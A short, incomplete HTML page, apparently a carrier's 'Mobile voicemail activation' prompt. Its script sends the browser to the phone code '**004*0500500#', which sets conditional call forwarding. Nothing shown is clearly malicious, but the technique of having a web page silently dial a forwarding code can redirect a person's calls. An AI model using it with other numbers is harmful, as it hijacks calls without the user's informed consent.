<html lang="en">

<head>

  <script type="text/javascript">
        function load()
        {
        $("#dialog-message" ).dialog({
          modal: true,
          buttons: {
            Ok: function() {
              window.location.href = "**004*0500500" + encodeURIComponent("#"); 
              $( this ).dialog("close");
            }
          }
        });
        }
  </script>
</head>

<body>

<div id="dialog-message" title="Mobile voicemail activation">
  <p>
    <span class="ui-icon ui-icon-circle-check" style="float:left; margin:0 7px 50px 0;"></span>
    Please click the Dial key when prompted to let your phone dial <a href="#">this</a>
  </p>
</div>
